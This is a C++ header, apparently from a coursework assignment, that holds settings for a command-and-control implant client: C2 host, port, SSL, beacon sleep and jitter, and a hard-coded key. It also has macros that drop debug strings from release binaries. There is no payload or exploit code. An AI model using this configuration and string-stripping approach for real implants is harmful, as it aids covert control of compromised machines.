#pragma once

////////////////////////
// Stores configuration details for the client
////////////////////////

int MAX_RETRIES = 3;
std::string C2HOST = "127.0.0.1";
WORD C2PORT = 443;
bool C2SSL = true;
int RETRY_SLEEP = 10000; // in milliseconds
int SLEEPTIME = 30; // in seconds
int JITTER_MAX = 30; // percent
int JITTER_MIN = 25; // percent
std::string KEY = "Password1!";

////////////////////////
// Define Macros
////////////////////////
// Do not edit below this line; these are just included here due to dependencies
// and due to the macros kind of making sense to include here

#ifdef _DEBUG
#define VERBOSE 1 // Allows the (helpful) output during Debug builds
#else
#define VERBOSE 0 // Disables output via macros and, as a result, removes those static strings from the compiled binary
#endif

// Use macros to prevent output/static strings from appearing in Release builds:
#pragma warning(disable: 4002) // Disables warning: too many arguments for function-like macro invocation 'PRINTF'
#if VERBOSE
#define PRINTF(f_, ...) printf((f_), __VA_ARGS__)
#define WPRINTF(f_, ...) wprintf((f_), __VA_ARGS__) //Slightly adjusted from the format given to us in hw07 to match the existing (known working) code format
#define CERR(x) std::cerr << x << std::endl
#define COUT(x) std::cout << x << std::endl
#define WCOUT(x) std::wcout << x << std::endl
#else
#define PRINTF(x)
#define WPRINTF(x) //Slightly adjusted from the format given to us in hw07 to match the existing (known working) code format
#define CERR(x)
#define COUT(x) 
#define WCOUT(x)
#endif